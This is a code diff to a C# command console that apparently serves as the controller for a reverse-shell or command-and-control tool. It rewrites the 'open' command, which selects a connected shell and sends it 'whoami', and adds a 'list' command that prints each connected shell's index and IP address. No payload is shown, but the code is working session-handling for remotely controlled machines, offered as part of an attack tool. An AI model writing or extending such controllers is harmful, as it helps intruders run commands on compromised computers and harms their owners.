@@ -14,16 +14,22 @@ namespace Controller
     public class Commands
     {
         [Command(Help = "Sets current active shell to be controlled.", Usage = "open [index] Ex. open 0")]
-        public void Open(string index) {
+        public void Open(string index) 
+        {
             try
             {
-                int _index = int.Parse(index);
+                int _index = 0;
 
-                Program.ActiveClient = Program.MainServer.Clients[_index];
+                if (int.TryParse(index, out _index))
+                {
 
-                Program.ActiveClient.WriteCMD("whoami");
+                    Program.ActiveClient = Program.MainServer.Clients[_index];
 
-                Utils.Logging.Write(Utils.Logging.Type.Success, $"Active shell is now " + index);
+                    Utils.Logging.Write(Utils.Logging.Type.Success, $"Active shell is now " + index);
+
+                    Program.ActiveClient.WriteCMD("whoami");
+                }
+                else Utils.Logging.Write(Utils.Logging.Type.Error, $"{index} is not a valid number.");
             }
             catch (ArgumentOutOfRangeException ex)
             {
@@ -31,6 +37,29 @@ namespace Controller
             }
             catch { }
         }
+        [Command(Help = "Shows all active shells.", Usage = "list")]
+        public void List()
+        {
+            var clonedclients = Program.MainServer.Clients.ToList();
+
+            if (clonedclients.Count > 0)
+            {
+                int maxiplength = clonedclients.OrderByDescending(x => x.EndPoint.Address.ToString()).FirstOrDefault().EndPoint.Address.ToString().Length;
+
+                foreach (var p in clonedclients)
+                {
+                    string ipaddr = Utils.String.PadRight(p.EndPoint.Address.ToString(), maxiplength);
+
+                    int index = clonedclients.IndexOf(p);
+
+                    Console.WriteLine($"{index} | IP: {ipaddr}", Utils.Logging.GetTypeColor(Utils.Logging.Type.Normal));
+                }
+            }
+            else
+                Utils.Logging.Write(Utils.Logging.Type.Error, $"There are no active shells...");
+            
+        }
+
         [Command(Help = "Displays help.", Usage = "help")]
         public void Help()
         {
